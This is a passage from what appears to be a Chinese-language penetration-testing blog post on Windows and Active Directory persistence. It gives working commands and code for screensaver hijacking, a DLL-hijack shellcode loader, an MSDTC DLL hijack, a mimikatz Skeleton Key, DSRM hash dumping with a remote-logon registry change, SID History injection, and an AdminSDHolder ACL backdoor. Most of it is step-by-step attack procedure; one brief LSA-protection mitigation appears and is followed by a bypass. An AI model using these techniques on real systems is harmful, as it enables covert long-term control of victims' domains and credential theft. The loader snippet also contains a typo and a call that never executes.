<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_CURRENT_USER\\Control Panel\\Desktop&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ScreenSaverIsSecure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;0&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#设定用户的超时时间,这里为60秒</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HKEY_CURRENT_USER\\Control Panel\\Desktop&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ScreenSaveTimeOut</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> REG_SZ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;60&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用户一段时间不活动后，即可收到返回的shell</p><h3 id="dll劫持" tabindex="-1"><a class="header-anchor" href="#dll劫持"><span>DLL劫持</span></a></h3><p>通过将同名的恶意dll文件放在合法的dll文件所在路径前的搜索位置，在启动程序时会首先加载恶意的dll文件 ,可以利用DLL注入进行权限维持，需要拥有管理员权限</p><h4 id="劫持应用程序" tabindex="-1"><a class="header-anchor" href="#劫持应用程序"><span>劫持应用程序</span></a></h4><p>以notepad++为例，通过process monitor观察notepad++加载的dll文件</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/notepad%2B%2B.png" alt="notepad++" tabindex="0" loading="lazy"><figcaption>notepad++</figcaption></figure><p>发现一个名为mscoree.dll的文件丢失，我们可以创建一个同名的dll文件，并放到目标目录下进行加载，后续也没有继续加载该dll文件</p><p>(后面发现这个版本的notepad++找不到可以利用的dll文件，干脆演示一下做法)</p><p>找到可以利用的dll文件之后，通过AheadLib生成恶意利用的cpp文件</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/aheadlib.png" alt="aheadlib" tabindex="0" loading="lazy"><figcaption>aheadlib</figcaption></figure><p>编辑生成的cpp文件，添加DoMagic函数，用于添加恶意代码</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD WINAPI </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">DoMagic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(LPVOID lpParameter) {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	unsigned</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> char</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> shellcode[] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	void*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> exec </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAlloc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, sizeof shellcode, MEN_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	memcpy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(exec, shellcode, sizeof shellcode);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	((</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)())exec);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	return</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在shellcode处添加生成的恶意代码，在DllMain添加调用规则</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		HANDLE hThread </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, DoMagic, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (hThread) {</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">			CloseHandle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(hThread);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将生成的DLL文件重命名，放到原有文件的目录下即可</p><p>注意：DLL劫持应用程序分为劫持已有的dll文件和not found的dll文件，劫持的原始dll文件为version.dll，位于system32下，因此需要将pragma语句指向c:\\windows\\system32\\version</p><h4 id="劫持系统服务" tabindex="-1"><a class="header-anchor" href="#劫持系统服务"><span>劫持系统服务</span></a></h4><p>MSDTC(分布式事务出力协调器)是windows系统服务。启动MSDTC时medtc.exe会动态加载dll文件</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/oci-dll.png" alt="oci-dll" tabindex="0" loading="lazy"><figcaption>oci-dll</figcaption></figure><p>oci.dll文件为not found,并且没有在下文中出现过，能过直接使用msf生成dll文件进行代替，将生成的dll文件上传至system32目录下即可</p><p>某些版本的系统下MSDTC是需要手动启动的，可通过命令将其修改为自启动</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sc config msdtc start= &quot;auto&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="常见域后门技术" tabindex="-1"><a class="header-anchor" href="#常见域后门技术"><span>常见域后门技术</span></a></h2><h3 id="创建skeleton-key域后门" tabindex="-1"><a class="header-anchor" href="#创建skeleton-key域后门"><span>创建Skeleton Key域后门</span></a></h3><p>Skeleton Key即万能钥匙。为了实施此攻击，攻击者必须具有域管理员权限。必须在每个域控制器上执行此攻击才能完全入侵，但即使针对单个域控制器也可能有效。重新启动域控制器将删除此恶意软件，攻击者必须重新部署它.</p><p>该攻击通过lsass进程实，统一认证的密码存储在内存中，可用于所有域用户的账户认证，现有密码也将继续有效，当DC重启后需要重新部署。</p><ul><li>上传mimikatz到域控制器，执行以下命令创建Skeleton Key后门</li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/skeleton-key.png" alt="skeleton-key" tabindex="0" loading="lazy"><figcaption>skeleton-key</figcaption></figure><p>出现如上界面即部署成功，现在可以使用统一的密码mimikatz进行登录</p><ul><li><p>缓解措施</p><p>本地安全机构(LSA)保护策略，用于防止对lsass.exe进程的内存读取和代码注入。通过执行以下命令，开启和关闭LSA保护策略</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#开启LSA保护策略</span></span>
<span class="line"><span>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RunAsPPL /t REG_DWORD /d 1 /f </span></span>
<span class="line"><span>#关闭LSA保护策略</span></span>
<span class="line"><span>reg delete &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RunAsPPL</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>开启LSA保护措施后，将无法使用mimikatz直接创建万能钥匙</p><p>可以使用mimikatz自带的mimidrv.sys驱动文件，进行LSA的绕过</p></li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/lsabypass-mimikatz.png" alt="lsabypass-mimikatz" tabindex="0" loading="lazy"><figcaption>lsabypass-mimikatz</figcaption></figure><h3 id="创建dsrm域后门" tabindex="-1"><a class="header-anchor" href="#创建dsrm域后门"><span>创建DSRM域后门</span></a></h3><p>目录服务还原模式(DSRM)是域控制器的安全模式启动项，用于使服务器脱机，进行紧急维护，在域控制器上DSRM的密码实际上就是本地管理员账户的密码。通过在域控制器上运行NTDSUtil,可以为DSRM账户修改密码</p><p>ntdsutil 是 Windows 操作系统中的一个命令行实用工具，而不是一个服务。它用于管理和维护 Active Directory 数据库。Active Directory 是一种目录服务.</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#进入ntdsutil</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ntdsutil</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#进入DSRM账户密码设置模式</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dsrm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> password</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#在当前域控制器上恢复DSRM密码</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">reset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> password</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> null</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#sync from domain account &lt;username&gt;与指定域用户的密码相同</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#输入新密码</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;password&gt;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#再次输入新密码</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;password&gt;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#退出dsrm密码设置模式</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">q</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#退出ntdsutil</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">q</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-pwd-reset.png" alt="dsrm-pwd-reset" tabindex="0" loading="lazy"><figcaption>dsrm-pwd-reset</figcaption></figure><ul><li><p>使用mimikatz获取dsrm账户的hash实现权限持久化(需要域管理员权限)</p><p>执行以下命令</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mimikatz.exe &quot;privilege::debug&quot; &quot; token::elevate&quot; &quot;lsadump::sam&quot; exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>读取本地SAM文件中dsrm账户的hash值</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/mimikatz-dsrm-hash-dump.png" alt="mimikatz-dsrm-hash-dump" tabindex="0" loading="lazy"><figcaption>mimikatz-dsrm-hash-dump</figcaption></figure><p>修改DSRM账户的登陆模式，以允许该账户的远程登录。通过编辑注册表的DsrmAdminLogonBehavior键值来实现，DSRM账户可选用的登陆模式有以下三种</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>0: 默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账户</span></span>
<span class="line"><span>1：只有当本地AD,DS服务停止时，才可以使用DSRM管理员账户进行登录</span></span>
<span class="line"><span>2：任何情况，都可以使用DSRM管理员账户登录域控制器</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行以下命令，将DSRM的登陆模式改为2</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v DsrmAdminLogonBehavior  /t REG-DWORD /d 2 /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-model2.png" alt="dsrm-model2" tabindex="0" loading="lazy"><figcaption>dsrm-model2</figcaption></figure><p>现在可以通过PTH，远程使用DSRM账户登录域控机器了</p></li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/dsrm-hash-login.png" alt="dsrm-hash-login" tabindex="0" loading="lazy"><figcaption>dsrm-hash-login</figcaption></figure><h3 id="sid-history利用" tabindex="-1"><a class="header-anchor" href="#sid-history利用"><span>SID History利用</span></a></h3><ul><li><p>SID &amp; SID History</p><p>每个用户帐号都有一个对应的安全标识符（Security Identifiers，SID），SID用于跟踪主体在访问资源时的权限。如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。</p><p>一个完整的SID包括：</p><ul><li>用户和组的安全描述</li><li>48-bit的ID authority</li><li>修订版本</li><li>可变的验证值Variable sub-authority values</li></ul><p>例：S-1-5-21-310440588-250036847-580389505-500<br> 第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。<br> 可以注意到最后一个标志位为500，这个500是相对标识符（Relative Identifer, RID），账户的RID值是固定的。一般克隆用户原理就是篡改其他用户的RID值使系统认为对应用户是管理员。<br> 常见的RID：500-管理员 519-EA 501-Guest</p><p>SID History是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户中，在域迁移中很适用。</p></li><li><p>SID History的利用</p><p>通过将域管理员用户的SID添加到其他域用户的SID History中以维持权限的持久化，需要拥有域管理员级别的权限</p><p>1.向域控制器上传mimikatz</p><p>执行以下命令，将域管用户的SID添加到hacker用户的SID History中</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#mimikatz&gt;2.1.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;privilege::debug&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;sid::patch&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;sid::add /sam:hacker /new:Administrator&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#mimikatz&lt;2.1.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;privilege::debug&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;misc:addsid hacker ADSAdministrator&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.通过powershell查看hacker用户的sid history</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Import-Module</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ActiveDirectory</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Get-ADUser</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Hacker</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Properties</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SIDHistory</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>3.通过hacker用户连接域控制器，可以是横向中的提供用户凭据的任意方法，登陆后可以通过whoami /priv查看到hacker用户拥有域管理员的所有权限</p></li></ul><h3 id="利用adminsdholder打造域后门" tabindex="-1"><a class="header-anchor" href="#利用adminsdholder打造域后门"><span>利用AdminSDHolder打造域后门</span></a></h3><ul><li><p>AdminSDHolder</p><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的System容器下用于管理和保护高权限用户或组的安全描述符，AdminSDHolder容器的主要目的是确保在域中具有高权限的用户和组（如域管理员、企业管理员等）不受非授权的更改。它通过定期检查和重置这些对象的安全描述符来实现这一目标，以防止恶意用户或恶意程序修改其权限。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/AdminSDHistory.png" alt="AdminSDHistory" tabindex="0" loading="lazy"><figcaption>AdminSDHistory</figcaption></figure><p>收保护的对象通常包括系统的特权用户和重要的组，例如Administrator,Domain Admins,Enterprise Admins以及Schema Admins等</p><p>在活动目录中，属性adminCount用来标记特权用户和组。对于特权用户和组来说，该属性被设置为1，通过AdFind查询adminCount属性设置为1的对象，可以找到所有被保护的特权用户和组。</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#枚举受保护的用户</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Adfind.exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DC=hack,DC=com</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -dn</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#枚举受保护的组</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Adfind.exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DC=hack,DC=com</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&amp;(objectcategory=group)(admincount=1)&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -dn</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过ActiveDirectory模块查询</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#查找用户</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ActiveDirectory</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-ADObject</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LDAPFilter </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |select name</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#查找组</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-ADObject</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LDAPFilter </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |select name</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>默认状态下，系统每60分钟检查受保护对象的安全描述符，将受保护对象的ACL与AdminSDHolder容器的ACL进行比较，不一致的话，系统将会把受保护对象的ACL强制修改为AdminSDHolder的ACL，通过SDProp进程来完成。</p><ul><li><p>操作AdminSDHolder对象的ACL</p><p>通过powerview向AdminSDHolder容器添加一个ACL对象，使普通用户hacker对AdminSDHolder有完全控制权</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\PowerView.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Add-ObjectAcl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">TargetADSprefix </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;CN=AdminSDHolder,CN=System&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PrincipalSamAccountName hacker </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Verbose </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Rights All</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img 